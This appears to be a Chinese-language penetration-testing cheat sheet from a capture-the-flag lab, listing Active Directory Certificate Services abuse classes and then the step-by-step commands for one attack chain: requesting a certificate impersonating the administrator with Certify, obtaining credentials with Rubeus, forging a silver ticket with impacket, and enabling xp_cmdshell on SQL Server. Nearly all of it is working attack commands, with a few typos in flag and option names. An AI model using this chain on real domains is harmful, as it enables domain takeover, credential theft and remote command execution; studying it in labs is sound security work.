





## Active Directory Certificate Services (AD CS) Abuse/Exploitation（ADCS证书滥用）

## Enrollee Supplies Subject

| 编号 | 名称                          | 一句话理解                         |
| ---- | ----------------------------- | ---------------------------------- |
| ECS1 | 模板允许自填身份              | 普通用户能申请“写着别人名字”的证书 |
| ESC2 | 过宽EKU/用途                  | 证书用途太万能， 拿去验证          |
| ECS3 | Enrollment Agent              | 用“代办证书”帮别人办证             |
| ECS4 | 模板对象权限                  | 你能改模板，把它改成可利用         |
| ECS5 | PKI对象ACL                    | 你能改CA/PKI关键对象               |
| ESC6 | EDIT_ATTRIBUTESUBJECTALTNAME2 | 旧CA配置允许乱写SAN                |
| ESC7 | CA管理权限                    | 能直接控制CA                       |
| ESC8 | Web Enroolment + NTLM         | 通过Web Enrollment + NTLM Relay    |

## 利用

（1）查询信息

**.**\Certify.exe find /vulnerable /currentuser

（2）申请证书

**.**\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

（3）转换证书格式

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

（4）注入证书并请求ASKTGT

**.**\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

（5）

**.**\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

## 银票

### 计算NTLMHash

import hashlib

hashlib.new('md4','REGGIE1234ronnie'.encode('utf-16le')).digest().hex()

### 获取域SID

Get-ADDomain **|** fl DomainSID

### 银票

#### 产生

impacket-ticketer -nthash <hash> -domian-sid <sid> -spn <spn> <user>

#### 连接

KRB5CCNAME=administrator.ccache impacket-mssqlclient -k <dc>

### 读取标志

SELECT ***** FROM OPENROWSET**(**BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB**)** AS Contents

### 执行

xp_cmdshell whoami;

EXECUTE sp_configure 'show advanced options',1

RECONFIGURE

EXECUTE sp_configure 'xm_cmdshell',1

RECONFIGURE

xp_cmdshell whoami